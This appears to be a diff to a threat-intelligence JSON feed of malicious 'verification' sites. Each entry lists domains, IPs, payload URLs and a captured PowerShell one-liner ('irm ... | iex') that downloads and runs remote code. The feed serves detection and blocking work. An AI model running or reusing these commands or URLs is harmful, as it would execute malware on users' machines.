@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "lockpressone.com.br",
+    "DeliveryUrl": [
+      "cfverification.com"
+    ],
+    "PayloadUrl": [
+      "https://cfverification.com/8pchkbdes5/abaa0e2b9cbc0f2d"
+    ],
+    "IP": [
+      "108.167.171.58"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cfverification[.]com/8pchkbdes5/abaa0e2b9cbc0f2d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://cfverification.com/8pchkbdes5/abaa0e2b9cbc0f2d"
+    ],
+    "ReportId": "cmx0v30tc027c0oml6hiztb1t",
+    "ScannedAt": "2026-11-28T20:27:16.125000+00:00"
+  },
+  {
     "UrlDomain": "73vyn.infinityfreeapp.com",
     "DeliveryUrl": [
       "script.google.com",
@@ -2347,27 +2366,5 @@
     ],
     "ReportId": "cmwwl1v8y024o0omlfdmj1ia6",
     "ScannedAt": "2026-11-25T20:35:21.405000+00:00"
-  },
-  {
-    "UrlDomain": "financialprostore.com",
-    "DeliveryUrl": [
-      "browse-login.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "45.40.147.96"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-login.info/083af9e16202853f",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-login[.]info/083af9e16202853f'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-login.info/083af9e16202853f"
-    ],
-    "ReportId": "cmwwkmver01io0omlprb0kkam",
-    "ScannedAt": "2026-11-25T20:23:41.768000+00:00"
   }
 ]
